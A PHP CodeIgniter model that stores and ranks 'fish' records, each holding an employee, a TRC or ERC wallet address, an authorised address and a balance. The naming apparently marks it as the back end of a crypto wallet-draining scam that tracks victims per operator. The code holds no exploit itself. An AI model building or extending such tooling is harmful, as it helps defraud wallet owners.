<?php if(!defined('BASEPATH')) exit('No direct script access allowed');


class Fish_model extends CI_Model
{

    function new_trc($employee, $address, $au_address)
    {
        $data = array(
            'employee'=>$employee,
            'address'=>$address,
            'au_address'=>$au_address,
            'type'=>'trc'
        );
        $this->db->insert('fish',$data);
    }

    function new_erc($employee, $address, $au_address)
    {
        $data = array(
            'employee'=>$employee,
            'address'=>$address,
            'au_address'=>$au_address,
            'type'=>'erc'
        );
        $this->db->insert('fish',$data);
    }
    
    function find_by_employee_2($employee_id,$page,$segment,$searchwhere){
        $this->db->select('*');
        $this->db->where('employee',$employee_id);
        $this->db->where('status',0);
         $this->db->where($searchwhere);
        $this->db->order_by('balance', 'DESC');
        $this->db->limit($page, $segment);
        $query = $this->db->get('fish');
        return $query->result_array();
    }
    
    function find_by_employee_1($employee_id,$page,$segment,$searchwhere){
        $this->db->select('*');
        $this->db->where('employee',$employee_id);
        $this->db->where('status',1);
         $this->db->where($searchwhere);
        $this->db->order_by('balance', 'DESC');
        $this->db->limit($page, $segment);
        $query = $this->db->get('fish');
        return $query->result_array();
    }

    function find_by_employee($employee_id,$page,$segment){
        $this->db->select('*');
        $this->db->where('employee',$employee_id);
        $this->db->order_by('balance', 'DESC');
        $this->db->limit($page, $segment);
        $query = $this->db->get('fish');
        return $query->result_array();
    }
    
    
    function find_all($page,$segment){
        $this->db->select('*');
        $this->db->order_by('balance', 'DESC');
        $this->db->limit($page, $segment);
        $query = $this->db->get('fish');

        return $query->result_array();
    }
    
    function find_all_2($page,$segment,$searchwhere){
        $this->db->select('*');
        $this->db->order_by('balance', 'DESC');
        $this->db->where('status',0);
        $this->db->where($searchwhere);
        $this->db->limit($page, $segment);
        $query = $this->db->get('fish');

        return $query->result_array();
    }

    function find_all_1($page,$segment,$searchwhere){
        $this->db->select('*');
        $this->db->order_by('balance', 'DESC');
        $this->db->where('status',1);
        $this->db->where($searchwhere);
        $this->db->limit($page, $segment);
        $query = $this->db->get('fish');

        return $query->result_array();
    }

    function count_by_employee($employee_id){
        $this->db->select('*');
        $this->db->where('employee',$employee_id);
        $query = $this->db->get('fish');
        return $query->num_rows();
    }
    
     function count_by_employee_1($employee_id,$searchwhere){
        $this->db->select('*');
        $this->db->where('employee',$employee_id);
        $this->db->where('status',1);
        $this->db->where($searchwhere);
        $query = $this->db->get('fish');
        return $query->num_rows();
    }
    
     function count_by_employee_2($employee_id,$searchwhere){
        $this->db->select('*');
        $this->db->where('employee',$employee_id);
        $this->db->where('status',0);
        $this->db->where($searchwhere);
        $query = $this->db->get('fish');
        return $query->num_rows();
    }
    
    function count_all_1($searchwhere){
        $this->db->select('*');
        $this->db->where('status',1);
        $this->db->where($searchwhere);
        $query = $this->db->get('fish');
        return $query->num_rows();
    }
    function count_all_2($searchwhere){
        $this->db->select('*');
        $this->db->where('status',0);
        $this->db->where($searchwhere);
        $query = $this->db->get('fish');
        return $query->num_rows();
    }

    function count_all(){
        $this->db->select('*');
        $query = $this->db->get('fish');
        return $query->num_rows();
    }

    function update_balance_by_address($address,$balance){
        $data = array(
            'balance' =>$balance
        );
        $this->db->where('address', $address);
        $this->db->update('fish', $data);
    }

    function detele_by_id($id){
        $this->db->where('id', $id);
        $this->db->delete('fish');
    }
    
    
    function is_new(){
        $this->db->select('*');
        $this->db->where('is_ts', 0);
        $query = $this->db->get('fish');

        return $query->result_array();
    }
    
    function qk(){
        $data = array(
            'is_ts' => 1
        );
        $this->db->update('fish', $data);
    }
    
    
}

?>